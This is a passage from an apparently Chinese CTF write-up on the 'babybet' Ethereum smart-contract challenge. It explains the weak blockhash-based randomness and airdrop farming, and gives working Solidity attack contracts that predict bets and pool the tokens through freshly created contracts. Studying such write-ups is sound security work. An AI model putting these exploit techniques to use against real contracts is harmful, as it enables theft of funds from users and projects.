<h2 id="babybet"><a href="#babybet" class="headerlink" title="babybet"></a>babybet</h2><p>给了部分合约代码<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line">contract babybet &#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) <span class="keyword">public</span> balance;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) <span class="keyword">public</span> status;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span></span><br><span class="line">    <span class="comment">//Gmail is ok. 163 and qq may have some problems.</span></span><br><span class="line">    event sendflag(<span class="built_in">string</span> md5ofteamtoken,<span class="built_in">string</span> b64email); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        balance[msg.sender]=<span class="number">1000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//pay for flag</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">payforflag</span>(<span class="params"><span class="built_in">string</span> md5ofteamtoken,<span class="built_in">string</span> b64email</span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balance[msg.sender] &gt;= <span class="number">1000000</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.sender!=owner)&#123;</span><br><span class="line">        balance[msg.sender]=<span class="number">0</span>;&#125;</span><br><span class="line">        owner.transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">        emit sendflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>逆向合约，得到关键函数：profit、bet、func_048F（转账函数）。<br>发现此问题相比上一道题利用方法更为简单。首先调用profit函数获得空投10 token。<br>之后进入bet函数，而bet函数有如下判断：首先余额要&gt;=10 、status要小于2、传入的参数要与随机数相同，之后便会给与此账户1000代币，并将status改为2 。<br>于是我们的函数调用顺序为：创建新合约账户A，调用profit、预测随机数调用guess、调用转账函数汇总token。<br>合约要求代币要&gt;1000000，所以上述薅羊毛过程需要重复1000次，并汇总到一个账户中。<br>具体合约如下：<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract midContract &#123;</span><br><span class="line">    babybet <span class="keyword">target</span> = babybet(x5d1BeEFD4dE611caFf204e1A318039324575599A);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> process() <span class="keyword">public</span> &#123;</span><br><span class="line">        <span class="keyword">target</span>.profit();</span><br><span class="line">        bytes32 guess = block.blockhash(block.<span class="keyword">number</span> - x01);</span><br><span class="line">        uint guess1 = uint(guess) % x03;</span><br><span class="line">        <span class="keyword">target</span>.bet(guess1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span></span> <span class="built_in">transfer</span>(address a, uint b) <span class="keyword">public</span>&#123;</span><br><span class="line">        // <span class="keyword">target</span>.func_048F(a,b);</span><br><span class="line">        bytes4 method = xf0d25268;</span><br><span class="line">        <span class="keyword">target</span>.<span class="keyword">call</span>(method,a,b);</span><br><span class="line">        selfdestruct();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    // babybet <span class="keyword">target</span>; = babybet(x5d1BeEFD4dE611caFf204e1A318039324575599A);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span></span> ffff() <span class="keyword">public</span> &#123;</span><br><span class="line">     for(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">20</span>;i++)&#123;</span><br><span class="line">            midContract mid = new midContract();</span><br><span class="line">            mid.process();</span><br><span class="line">            mid.<span class="built_in">transfer</span>(<span class="string">"0x9b9a30b7df47b9dbe0ec7d4bd52aaae4465f2ebe"</span>,<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>每次生成新合约，循环20次，所以此合约执行50次即可。记得将gas limit调大。<br>预测十分简单，即使用一下语句即可<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/15589284998213.jpg" alt=""><br><img src="/2018/04/07/强网杯2019writeup/15587965945276/788BCCDA110BDF3D121071BE06087E65.jpg" alt="788BCCDA110BDF3D121071BE06087E65"><br><img src="/2018/04/07/强网杯2019writeup/15587965945276/E49C45F46049C891DFAD6EEE3662C1C9.jpg" alt="E49C45F46049C891DFAD6EEE3662C1"><br>调用后拿到flag<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.41.53.png" alt="屏幕快照 2019-05-27 上午11.41.53"></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/04/07/时间盲注学习/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          时间盲注学习
        
      </div>
    </a>
  
  
    <a href="/2018/03/08/实验吧几道注入题/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">实验吧几道注入题</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#upload"><span class="nav-number">1.1.</span> <span class="nav-text">upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#审计分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">审计分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#高明的黑客"><span class="nav-number">1.2.</span> <span class="nav-text">高明的黑客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#护网先锋上单"><span class="nav-number">1.3.</span> <span class="nav-text">护网先锋上单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babybet"><span class="nav-number">1.4.</span> <span class="nav-text">babybet</span></a></li></ol></li></ol>
    
    </div>
  </aside>

</section>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/friend" class="mobile-nav-link">Friend</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2019 Altm4nz All Rights Reserved.
        
            <span id="busuanzi_container_site_uv">  
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
            </span>
          
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>








	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
</body>
</html>
